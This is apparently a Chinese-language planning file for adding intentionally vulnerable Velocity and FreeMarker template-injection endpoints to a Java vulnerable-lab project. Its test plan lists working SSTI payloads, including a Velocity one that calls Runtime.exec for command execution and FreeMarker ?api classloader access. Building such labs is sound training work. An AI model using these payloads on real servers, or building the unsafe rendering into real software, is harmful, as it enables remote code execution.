# Current Goal

## Goal

**G04: 模板注入（中危）** - 添加 Velocity 和 FreeMarker SSTI 漏洞

## Current State

设计阶段，确认范围和依赖。

## Confirmed Approach

**范围：** Velocity (1个端点) + FreeMarker (1个端点)
**依赖：** 需添加 Velocity 和 FreeMarker 依赖
**版本：** 仅漏洞版本（不实现安全版本）

## Acceptance Criteria

- [ ] 在 pom.xml 添加 Velocity 和 FreeMarker 依赖
- [ ] 创建 VelocityController.java
- [ ] 创建 FreeMarkerController.java
- [ ] 实现 `/ssti/velocity/vuln` 端点
- [ ] 实现 `/ssti/freemarker/vuln` 端点
- [ ] 创建 validation/payloads/ssti_payloads.txt
- [ ] 更新 validation/quick_validate.sh 添加 SSTI 测试
- [ ] 编译测试通过

## Test Plan

### Velocity SSTI 测试
1. `/ssti/velocity/vuln?template=#set($x='')##$x.class.forName('java.lang.Runtime').getRuntime().exec('whoami')` - RCE
2. `/ssti/velocity/vuln?template=$math` - 信息泄露
3. `/ssti/velocity/vuln?template=${"test"}` - 基本渲染

### FreeMarker SSTI 测试
1. `/ssti/freemarker/vuln?template="test"?api` - 信息泄露
2. `/ssti/freemarker/vuln?template=${"test"?api}` - API 访问
3. `<#assign classloader=object?api.class.getClassLoader()>` - 高级利用

## Implementation Plan

### Task 1: 添加模板引擎依赖

文件路径: `java-vuln-lab/pom.xml`

添加依赖:
```xml
<!-- Velocity 1.7 (用于 SSTI) -->
<dependency>
    <groupId>org.apache.velocity</groupId>
    <artifactId>velocity</artifactId>
    <version>1.7</version>
</dependency>

<!-- FreeMarker 2.3.31 (用于 SSTI) -->
<dependency>
    <groupId>org.freemarker</groupId>
    <artifactId>freemarker</artifactId>
    <version>2.3.31</version>
</dependency>
```

### Task 2: 创建 VelocityController.java

文件路径: `java-vuln-lab/src/main/java/com/vulnlab/controller/VelocityController.java`

端点: `/ssti/velocity/vuln`

### Task 3: 创建 FreeMarkerController.java

文件路径: `java-vuln-lab/src/main/java/com/vulnlab/controller/FreeMarkerController.java`

端点: `/ssti/freemarker/vuln`

### Task 4: 创建验证 Payload 文件

文件路径: `validation/payloads/ssti_payloads.txt`

### Task 5: 更新验证脚本

在 `validation/quick_validate.sh` 添加 SSTI 测试

### Task 6: 编译测试

- `mvn clean compile`
- 启动应用验证端点可访问

## Blockers

- 无

## Open Questions

- 无

## Sync Notes

- 2026-03-31: G03 同步完成，启动 G04 设计
